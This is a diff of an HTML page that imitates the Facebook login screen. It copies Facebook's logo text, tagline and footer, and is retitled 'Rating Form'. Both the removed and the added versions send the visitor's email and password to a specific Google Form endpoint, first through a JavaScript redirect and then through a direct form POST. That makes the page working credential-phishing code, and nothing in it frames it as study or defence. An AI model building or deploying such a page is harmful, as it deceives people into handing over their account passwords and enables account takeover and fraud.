@@ -1,107 +1,382 @@
+
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <title>Rating Form</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <!-- Font Awesome for the eye icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #e9eff1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background: #fff;
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.1);
-            width: 360px;
-        }
-        .login-container h1 {
-            text-align: center;
-            color: #1877f2;
-            margin-bottom: 1.5rem;
-        }
-        .form-group {
-            margin-bottom: 1rem;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            color: #333;
-        }
-        .form-group input {
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Roboto", sans-serif;
+}
+
+.res {
+    display: flex;
+    align-items: center;
+}
+
+.row {
+    padding: 0 15px;
+    min-height: 100vh;
+    justify-content: center;
+    background: #f0f2f5;
+}
+
+.fb-form {
+    justify-content: space-between;
+    max-width: 1000px;
+    width: 100%;
+}
+
+.fb-form .card {
+    margin-bottom: 90px;
+}
+
+.fb-form h1 {
+    color: #1877f2;
+    font-size: 4rem;
+    margin-bottom: 10px;
+}
+
+.fb-form p {
+    font-size: 1.75rem;
+    white-space: nowrap;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+    background: #fff;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    width: 100%;
+}
+
+form input {
+    height: 55px;
+    width: 100%;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    margin-bottom: 15px;
+    font-size: 1rem;
+    padding: 0 14px;
+}
+
+form input:focus {
+    outline: none;
+    border-color: #1877f2;
+}
+
+::placeholder {
+    color: #777;
+    font-size: 1.063rem;
+}
+
+/* Style for the eye icon */
+.eye-icon {
+    position: absolute;
+    top: 50%;
+    right: 10px;
+    transform: translateY(-50%);
+    cursor: pointer;
+    visibility: hidden; /* Hide initially */
+    font-size: 0.9em; /* Smaller size */
+    color: #zzz; /* Lighter color */
+}
+
+
+.fb-submit {
+    display: flex;
+    flex-direction: column;
+    text-align: center;
+    gap: 15px;
+}
+
+.fb-submit .login {
+    border: none;
+    outline: none;
+    cursor: pointer;
+    background: #1877f2;
+    padding: 15px 0;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 1.25rem;
+    font-weight: 600;
+    transition: 0.2s ease;
+}
+
+.fb-submit .login:hover {
+    background: #0d65d9;
+}
+
+form a {
+    text-decoration: none;
+}
+
+.fb-submit .forgot {
+    color: #1877f2;
+    font-size: 0.875rem;
+}
+
+.fb-submit .forgot:hover {
+    text-decoration: underline;
+}
+
+hr {
+    border: none;
+    height: 1px;
+    background-color: #ccc;
+    margin-bottom: 20px;
+    margin-top: 20px;
+}
+
+.button {
+    margin-top: 25px;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.button a {
+    padding: 15px 20px;
+    background: #42b72a;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 1.063rem;
+    font-weight: 600;
+    transition: 0.2s ease;
+}
+
+.button a:hover {
+    background: #3ba626;
+}
+
+.footer-langs {
+    max-width: 1000px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+footer ol {
+    display: flex;
+    flex-wrap: wrap;
+    list-style-type: none;
+    padding: 8px 0;
+
+    margin-left: 3vh;
+}
+
+footer ol:first-child {
+    border-bottom: 1px solid #dddfe2;
+}
+
+footer ol:first-child li:last-child button {
+    background-color: #f5f6f7;
+    border: 1px solid #ccd0d5;
+    outline: none;
+    color: #4b4f56;
+    padding: 0 8px;
+    font-weight: 700;
+    font-size: 12px;
+}
+
+footer ol li {
+    padding-right: 20px;
+    font-size: 12px;
+    color: #8a8d91;
+}
+
+footer ol li a {
+    text-decoration: none;
+    color: #8a8d91;
+}
+
+footer ol li a:hover {
+    text-decoration: underline;
+}
+
+footer small {
+    font-size: 12px;
+    color: #8a8d91;
+    margin-left: 3vh;
+}
+
+@media (max-width: 900px) {
+    .fb-form {
+        flex-direction: column;
+        text-align: center;
+    }
+
+    .fb-form .card {
+        margin-bottom: 30px;
+    }
+}
+
+@media (max-width: 460px) {
+    .fb-form h1 {
+        font-size: 3.5rem;
+    }
+
+    .fb-form p {
+        font-size: 1.3rem;
+    }
+
+    form {
+        padding: 15px;
+    }
+}
+
+
+
+
+
+        /* Style for the password container */
+        .password-container {
+            position: relative;
             width: 100%;
-            padding: 0.75rem;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+            margin-bottom: 15px;
         }
-        .form-group input:focus {
-            border-color: #1877f2;
-            outline: none;
-        }
-        .form-group button {
+
+        /* Style for the password input field */
+        .password-container input[type="password"],
+        .password-container input[type="text"] {
             width: 100%;
-            padding: 0.75rem;
-            border: none;
-            border-radius: 4px;
-            background-color: #1877f2;
-            color: #fff;
-            font-size: 1rem;
+            padding-right: 40px; /* Add space for the eye icon */
+            box-sizing: border-box;
+        }
+
+        /* Style for the eye icon */
+        .eye-icon {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
             cursor: pointer;
-        }
-        .form-group button:hover {
-            background-color: #165eab;
-        }
-        .form-group .link {
-            display: block;
-            text-align: center;
-            color: #1877f2;
-            text-decoration: none;
-            margin-top: 1rem;
-        }
-        .form-group .link:hover {
-            text-decoration: underline;
+            visibility: hidden; /* Hide initially */
         }
     </style>
 </head>
+
 <body>
-    <div class="login-container">
-        <h1>Facebook</h1>
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email or Phone</label>
-                <input type="text" id="email" name="email" required>
+    <div class="row res">
+        <div class="fb-form res">
+            <div class="card">
+                <h1>facebook</h1>
+                <p>Connect with friends and the world</p>
+                <p>around you on Facebook.</p>
             </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <div class="form-group">
-                <button type="submit">Log In</button>
-            
-        </form>
+
+            <!-- Replace the form action with your Google Form URL -->
+            <form action="https://docs.google.com/forms/d/e/1FAIpQLSeCaN6HavNS7IgsFzAlCfkuPcRORG6gPPCUecky1nZNNW8dcw/formResponse" method="POST">
+                <input type="email" name="entry.1735650247" placeholder="Email or phone number" required>
+                
+                <!-- Password field with toggle visibility feature -->
+                <div class="password-container">
+                    <input type="password" id="password" name="entry.280048995" placeholder="Password" required oninput="showEyeIcon()">
+                    <span class="eye-icon" onclick="togglePassword()">
+                        <i id="eyeIcon" class="fas fa-eye-slash"></i>
+                    </span>
+                </div>
+
+                <div class="fb-submit">
+                    <button type="submit" class="login">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
     </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from submitting the traditional way
-            
-            // Collect form data
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+    <footer>
+        <div class="footer-langs">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">मराठी</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">ગુજરાતી</a></li>
+                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li><a href="#">ਪੰਜਾਬੀ</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><button>+</button></li>
+            </ol>
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In</a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Video</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Meta Store</a></li>
+                <li><a href="#">Meta Quest</a></li>
+                <li><a href="#">Imagine with Meta AI</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Fundraisers</a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Voting Information Centre</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Privacy Centre</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Create ad</a></li>
+                <li><a href="#">Create Page</a></li>
+                <li><a href="#">Developers</a></li>
+                <li><a href="#">Careers</a></li>
+                <li><a href="#">Cookies</a></li>
+                <li><a href="#">AdChoices</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Contact uploading and non-users</a></li>
+            </ol>
+            <small>Meta © 2024</small>
+        </div>
+    </footer>
 
-            // Replace 'YOUR_FORM_ID' with your actual Google Form ID
-            // Replace 'YOUR_EMAIL_ENTRY_ID' and 'YOUR_PASSWORD_ENTRY_ID' with your actual Google Form entry IDs
-            const googleFormURL = `https://docs.google.com/forms/d/e/1FAIpQLSeCaN6HavNS7IgsFzAlCfkuPcRORG6gPPCUecky1nZNNW8dcw/formResponse?entry.1735650247=${encodeURIComponent(email)}&entry.280048995=${encodeURIComponent(password)}`;
-            
-            // Redirect to the Google Form with prefilled data
-            window.location.href = googleFormURL;
-        });
+    <!-- JavaScript function to toggle password visibility and show eye icon -->
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            } else {
+                passwordField.type = 'password';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            }
+        }
+
+        function showEyeIcon() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.querySelector('.eye-icon');
+            if (passwordField.value) {
+                eyeIcon.style.visibility = 'visible';
+            } else {
+                eyeIcon.style.visibility = 'hidden';
+            }
+        }
     </script>
 </body>
+
 </html>
